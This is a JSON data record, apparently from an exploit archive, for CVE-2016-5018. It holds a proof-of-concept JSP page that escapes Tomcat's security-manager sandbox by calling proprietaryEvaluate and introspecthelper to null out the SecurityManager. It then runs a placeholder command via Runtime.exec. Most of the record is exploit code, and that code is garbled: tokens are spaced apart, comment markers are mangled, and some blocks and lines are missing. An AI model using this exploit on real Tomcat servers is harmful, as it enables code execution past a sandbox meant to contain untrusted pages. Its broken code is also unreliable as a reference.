{
    "text": "vul_name : Tomcat proprietaryEvaluate 9.0.0.M1 Sandbox Escape ， vul_cve : CVE-2016-5018 ， vul_poc :  # Exploit Title : Tomcat proprietaryEvaluate 9.0.0.M1 - Sandbox Escape ，  # Date : 2020-01-07 ，  # Exploit Author : Harrison Neal , PatchAdvisor ，  # Vendor Homepage :  ，  # Software Link :  ，  # Version : 8.0.36 ，  # Description : Tomcat proprietaryEvaluate/introspecthelper Sandbox Escape ，  # Tested on : Windows ，  # CVE : CVE-2016-5018 ，  # See for more information about the default sandbox. ，  # When Tomcat 8 is configured to run as a service , you can use the Tomcat8w.exe tool to enable/disable the security manager. ，  # In the Java tab , add the following options :  ，  # -Djava.security.manager ，  # -Djava.security.policy=C : \\Program Files\\Apache Software Foundation\\Tomcat 8.0\\conf\\catalina.policy ， <% @ page import=\"java.util. *  , java.io. *  , org.apache.jasper.runtime. *  , java.lang.reflect. * \"%> ， <% ， SecurityManager sm = System.getSecurityManager (  )  ;  ， ProtectedFunctionMapper pfm = ProtectedFunctionMapper.getInstance (  )  ;  ， { / Tomcat 7+ ， / Get the desired method ， Method [  ] methods = ( Method [  ]  ) PageContextImpl.proprietaryEvaluate (  ， \" $ {pageContext.getServletContext (  ) .getClass (  ) .getDeclaredMethods (  ) }\" ,  ， Method [  ] .class , pageContext , pfm / *  , false * / )  ; / Uncomment \"false\" parameter for Tomcat 7 ， Method theMethod = null ;  ， theMethod = m ;  ， } ， } ， / Set it to accessible ， JspRuntimeLibrary.introspecthelper (  ， theMethod ,  ， \"accessible\" ,  ， \"true\" ,  ， request ,  ， null ,  ， false )  ;  ， / Run it ， theMethod.invoke ( pageContext.getServletContext (  )  ,  ， System.class.getMethod ( \"setSecurityManager\" , new Class [  ] {SecurityManager.class} )  ,  ， null ,  ， new Object [  ] {null} ，  )  ;  ， } ， / * { / Tomcat 5.5 and 6 ， pfm.mapFunction ( \"hello : world\" , System.class , \"setSecurityManager\" , new Class [  ] { SecurityManager.class } )  ;  ， PageContextImpl.proprietaryEvaluate ( \" $ {hello : world ( null ) }\" , Object.class , pageContext , pfm , false )  ;  ， } * / ， } catch ( Throwable ex ) { ， PrintWriter pw = new PrintWriter ( out )  ;  ， ex.printStackTrace ( pw )  ;  ， pw.flush (  )  ;  ， } ， } ， / Your payload goes here ， Runtime.getRuntime (  ) .exec ( \"calc\" )  ;  ， } catch ( Throwable ex ) { ， PrintWriter pw = new PrintWriter ( out )  ;  ， ex.printStackTrace ( pw )  ;  ， pw.flush (  )  ;  ， } ， / Optional put the security manager back ， System.setSecurityManager ( sm )  ;  ， } ， %>",
    "time": "2020.01.08"
}